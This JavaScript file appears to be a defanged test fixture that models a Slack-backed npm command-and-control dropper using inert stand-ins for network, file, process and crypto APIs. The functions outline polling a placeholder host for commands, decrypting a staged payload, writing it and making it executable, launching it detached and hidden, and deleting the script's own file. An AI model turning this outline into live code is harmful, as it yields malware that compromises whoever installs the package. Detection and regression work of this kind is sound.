// DEFANGED STRUCTURAL REGRESSION: no real modules are imported and every side-effect API is an inert local shim.
// The strings and call shapes model a Slack-backed npm C2 dropper without live secrets, live domains, or executable payloads.

const https = {
  request(_options, _handler) {
    return { on() {}, write() {}, end() {} };
  },
};

const fs = {
  writeFileSync() {},
  chmodSync() {},
  unlinkSync() {},
};

const path = {
  join(...parts) {
    return parts.join("/");
  },
};

const child = {
  spawn() {
    return { unref() {} };
  },
};

const crypto = {
  subtle: {
    importKey() {},
    deriveKey() {},
    decrypt() {},
  },
};

const token = "xoxb-REDACTED-REDACTED-REDACTED";
const channel = "REDACTED_CHANNEL_ID";
const out = path.join("defanged", "subwatcher");

async function decryptStage(encrypted, key) {
  await crypto.subtle.importKey("raw", key, "PBKDF2", false, ["deriveKey"]);
  await crypto.subtle.deriveKey(
    { name: "PBKDF2", salt: "redacted", iterations: 100000, hash: "SHA-256" },
    key,
    { name: "AES-GCM", length: 256 },
    false,
    ["decrypt"],
  );
  return crypto.subtle.decrypt({ name: "AES-GCM", iv: "redacted" }, key, encrypted);
}

function pollSlackC2() {
  const headers = { Authorization: "Bearer " + token };
  return https.request({
    hostname: "example.invalid",
    path: "/api/conversations.history?channel=" + channel,
    method: "GET",
    headers,
  }, () => {});
}

function stageAndLaunch(defangedPayload) {
  fs.writeFileSync(out, defangedPayload, "utf8");
  fs.chmodSync(out, "755");
  child.spawn(process.execPath, [out], { detached: true, stdio: "ignore", windowsHide: true }).unref();
}

function cleanup() {
  fs.unlinkSync(__filename);
}

export { decryptStage, pollSlackC2, stageAndLaunch, cleanup };
